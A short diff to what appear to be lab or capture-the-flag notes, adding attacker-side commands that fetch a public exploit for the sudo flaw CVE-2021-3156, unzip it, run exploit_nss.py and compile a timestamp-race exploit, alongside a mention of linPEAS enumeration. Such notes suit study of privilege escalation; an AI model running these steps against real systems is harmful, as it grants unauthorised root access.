@@ -84,4 +84,10 @@ were going to download linPEAS to ourselves (ATTACKER) and then access it throug
 (ATTACKER) ls
 (ATTACKER) wget https://codeload.github.com/worawit/CVE-2021-3156/zip/main
 (ATTACKER) file main
-(ATTACKER) unzip
+(ATTACKER) unzip main
+(ATTACKER) ls
+(ATTACKER)cd CVE-2021-3156-main
+(ATTACKER) cat readme [2:11][DAY 12]
+(ATTACKER) python3 exploit_nss.py
+(ATTACKER) gcc -o exploit_timestamp_race exploit_timestamp_race.c [2:12:27]
+
